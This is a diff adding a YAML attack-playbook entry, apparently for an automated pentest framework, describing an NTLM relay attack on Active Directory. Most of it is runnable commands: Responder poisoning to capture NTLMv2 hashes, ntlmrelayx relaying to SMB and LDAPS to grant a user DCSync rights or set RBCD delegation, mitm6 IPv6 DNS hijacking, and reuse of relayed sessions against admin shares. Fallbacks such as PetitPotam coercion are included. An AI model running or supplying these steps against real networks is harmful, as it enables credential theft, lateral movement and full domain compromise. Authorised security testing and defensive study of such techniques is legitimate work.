@@ -1,0 +1,49 @@
+id: ad_ntlmrelay
+title: "AD — NTLM relay (mitm6 + ntlmrelayx) to LDAP/SMB/HTTP"
+phase: lateral
+mitre: ["T1557.001", "T1187"]
+trigger:
+  services: ["smb", "ldap", "ldaps", "http", "https"]
+  ports:    [445, 389, 636, 80, 443]
+  os_any:   ["windows", "windows server"]
+  technologies: ["active directory"]
+keywords: ["ntlm relay", "ntlmrelayx", "mitm6", "responder", "ipv6 dns hijack", "wpad"]
+preconditions:
+  - "Network L2 position (same VLAN as victims) OR adjacent broadcast domain"
+  - "Target SMB signing not required (default on workstations)"
+steps:
+  - tool: nmap
+    cmd:  "nmap -p445 --script=smb-protocols,smb-security-mode {target_subnet}/24"
+    why:  "Filter to hosts with SMB signing not required (signing:disabled OR not_required) — relay candidates"
+  - tool: nxc
+    cmd:  "nxc smb {target_subnet}/24 --gen-relay-list relay_targets.txt"
+    why:  "NetExec one-liner — produces a clean list of relayable hosts"
+  - tool: responder
+    cmd:  "responder -I eth0 -A"
+    why:  "Analyze mode first — see who's broadcasting LLMNR/NBT-NS without poisoning"
+  - tool: responder
+    cmd:  "responder -I eth0 -wd"
+    why:  "Active poison: LLMNR + NBT-NS + WPAD + DHCP — captures NTLMv2 hashes for offline crack"
+  - tool: ntlmrelayx
+    cmd:  "ntlmrelayx.py -tf relay_targets.txt -smb2support -socks"
+    why:  "Listener — relay caught NTLM auth to SMB targets; SOCKS proxy lets you reuse the auth interactively"
+  - tool: ntlmrelayx
+    cmd:  "ntlmrelayx.py -t ldaps://{dc_ip} --escalate-user {user} -smb2support"
+    why:  "Relay machine NTLM to LDAPS → grant {user} DCSync rights"
+  - tool: ntlmrelayx
+    cmd:  "ntlmrelayx.py -t ldap://{dc_ip} --delegate-access --escalate-user {user} --no-smb-server"
+    why:  "RBCD — write msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer"
+  - tool: mitm6
+    cmd:  "mitm6 -d {domain} -i eth0"
+    why:  "Pair with ntlmrelayx — IPv6 DNS hijack causes Windows to NTLM-authenticate to attacker over WPAD"
+  - tool: proxychains
+    cmd:  "proxychains -q smbclient -W {domain} -U {user}%anything //{relayed_target}/C\\$"
+    why:  "Reuse SOCKS-proxied auth without re-relaying"
+expected_outcome: "Local admin on relayed target; DCSync rights for chosen user via LDAP relay; RBCD for impersonation"
+fallbacks:
+  - "If SMB signing enforced everywhere → coerce machine accounts (PetitPotam) and relay to LDAP/AD CS instead"
+  - "WebDAV trick — coerce HTTP→SMB downgrade by mounting attacker WebDAV share"
+  - "Disable SMB signing on attacker box if you act as the relayed-to host"
+references:
+  - "https://www.thehacker.recipes/ad/movement/ntlm/relay"
+  - "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py"
